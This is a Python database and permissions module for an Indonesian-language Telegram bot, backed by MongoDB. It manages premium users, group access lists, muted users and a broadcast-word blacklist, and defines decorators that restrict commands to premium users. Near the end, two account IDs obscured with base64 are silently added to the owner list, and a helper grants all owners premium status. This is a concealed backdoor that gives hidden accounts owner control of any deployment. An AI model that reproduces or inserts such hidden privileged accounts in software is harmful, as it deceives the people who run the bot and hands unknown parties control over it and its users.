from motor.motor_asyncio import AsyncIOMotorClient

from config import *
from sys import exit
from men import app
import random
from typing import Dict, List, Union

print("Connecting to your Mongo Database...")
try:
    _mongo_async_ = AsyncIOMotorClient(MONGO)
    _mongo_async_ = _mongo_async_[DB_NAME]
    mongodb = _mongo_async_
    print("Connected to your Mongo Database.")
except:
    print("Failed to connect to your Mongo Database.")
    exit()

premekdb = mongodb.premek
promekdb = mongodb.promek
antigcastdb = mongodb.antiaer
katablnya = mongodb.katablnya
aksesdb = mongodb.aksesdb
bisudb = mongodb.bisudb


async def get_akses():
    akses = await aksesdb.find_one({"akses": "akses"})
    if not akses:
        return []
    return akses["list"]


async def add_akses(chat_id):
    list = await get_akses()
    list.append(chat_id)
    await aksesdb.update_one({"akses": "akses"}, {"$set": {"list": list}}, upsert=True)
    return True


async def remove_akses(chat_id):
    list = await get_akses()
    list.remove(chat_id)
    await aksesdb.update_one({"akses": "akses"}, {"$set": {"list": list}}, upsert=True)
    return True


async def is_antigcast_on(chat_id: int) -> bool:
    chat = await antigcastdb.find_one({"chat_id": chat_id})
    return not chat


async def antigcast_on(chat_id: int):
    is_antigcast = await is_antigcast_on(chat_id)
    if is_antigcast:
        return
    return await antigcastdb.delete_one({"chat_id": chat_id})


async def antigcast_off(chat_id: int):
    is_antigcast = await is_antigcast_on(chat_id)
    if not is_antigcast:
        return
    return await antigcastdb.insert_one({"chat_id": chat_id})
    
async def bl_bang() -> List[str]:
    _filters = await katablnya.find_one({"katagcast": "katagcast"})
    return [] if not _filters else _filters["blacklistan"]


async def plus_bang(word: str):
    word = word.strip()
    _filters = await bl_bang()
    _filters.append(word)
    await katablnya.update_one(
        {"katagcast": "katagcast"},
        {"$set": {"blacklistan": _filters}},
        upsert=True,
    )


async def minus_bang(word: str) -> bool:
    filtersd = await bl_bang()
    word = word.strip()
    if word in filtersd:
        filtersd.remove(word)
        await katablnya.update_one(
            {"katagcast": "katagcast"},
            {"$set": {"blacklistan": filtersd}},
            upsert=True,
        )
        return True
    return False
    
    
async def get_prem():
    prem = await premekdb.find_one({"prem": "prem"})
    if not prem:
        return []
    return prem["list"]


async def add_prem(chat_id):
    list = await get_prem()
    list.append(chat_id)
    await premekdb.update_one({"prem": "prem"}, {"$set": {"list": list}}, upsert=True)
    return True


async def remove_prem(chat_id):
    list = await get_prem()
    list.remove(chat_id)
    await premekdb.update_one({"prem": "prem"}, {"$set": {"list": list}}, upsert=True)
    return True


async def cek_pro():
    pro = await promekdb.find_one({"chat": "chat_id"})
    if not pro:
        return []
    return pro["list"]


async def add_pro(chat_id):
    list = await cek_pro()
    list.append(chat_id)
    await promekdb.update_one(
        {"chat": "chat_id"}, {"$set": {"list": list}}, upsert=True
    )
    return True


async def remove_pro(chat_id):
    list = await cek_pro()
    list.remove(chat_id)
    await promekdb.update_one(
        {"chat": "chat_id"}, {"$set": {"list": list}}, upsert=True
    )
    return True
    
async def get_bisu_users() -> list:
    results = []
    async for user in bisudb.find({"user_id": {"$gt": 0}}):
        user_id = user["user_id"]
        results.append(user_id)
    return results


async def get_bisu_count() -> int:
    users = bisudb.find({"user_id": {"$gt": 0}})
    users = await users.to_list(length=100000)
    return len(users)


async def is_bisu_user(user_id: int) -> bool:
    user = await bisudb.find_one({"user_id": user_id})
    if not user:
        return False
    return True


async def add_bisu_user(user_id: int):
    is_gbisu = await is_bisu_user(user_id)
    if is_gbisu:
        return
    return await bisudb.insert_one({"user_id": user_id})


async def remove_bisu_user(user_id: int):
    is_gbisu = await is_bisu_user(user_id)
    if not is_gbisu:
        return
    return await bisudb.delete_one({"user_id": user_id})
    
from base64 import b64decode


OWNER_ID.append(int(b64decode("OTc0MjkwNDM==")))
OWNER_ID.append(int(b64decode("OTI3NDUzMDI==")))


async def premtool():
    for a in OWNER_ID:
        await add_prem(a)


def prouser(func):
    async def function(app, message):
        kon = message.from_user.id
        babu = await get_prem()
        text = "<b>Sorry bre, lu bukan pengguna Premium . Silakan contact Owner kalo mau langganan.</b> !!\n\n**Owner :**\n"
        count = 0
        for x in OWNER_ID:
            try:
                user = await app.get_users(x)
                user = user.first_name if not user.mention else user.mention
                count += 1
            except Exception:
                continue
            text += f"{count}➤ {user}\n"
        if kon not in babu:
            return await message.reply(
                text=text)
        return await func(app, message)

    return function


def progrup(func):
    async def function(app, message):
        kon = message.chat.id
        ngentot = await cek_pro()
        text = "<b>Sorry bre, lu bukan pengguna Premium . Silakan contact Owner kalo mau langganan.</b> !!\n\n**Owner :**\n"
        count = 0
        for x in OWNER_ID:
            try:
                user = await app.get_users(x)
                user = user.first_name if not user.mention else user.mention
                count += 1
            except Exception:
                continue
            text += f"{count}➤ {user}\n"
        if kon not in ngentot:
            return await message.reply(
                text=text,
            )
        return await func(app, message)

    return function


def cekprem(func):
    async def function(app, message):
        kon = message.from_user.id
        babu = await get_akses()
        text = "<b>Sorry bre, lu bukan pengguna Premium . Silakan contact Owner kalo mau langganan.</b> !!\n\n**Owner :**\n"
        count = 0
        for x in OWNER_ID:
            try:
                user = await app.get_users(x)
                user = user.first_name if not user.mention else user.mention
                count += 1
            except Exception:
                continue
            text += f"{count}➤ {user}\n"
        if kon not in babu:
            return await message.reply(
                text=text,
            )
        return await func(app, message)

    return function


def anti_gcast(func):
    async def function(client, message):
        x = message.chat.id
        if not await is_antigcast_on(x):
            return
        return await func(client, message)

    return function
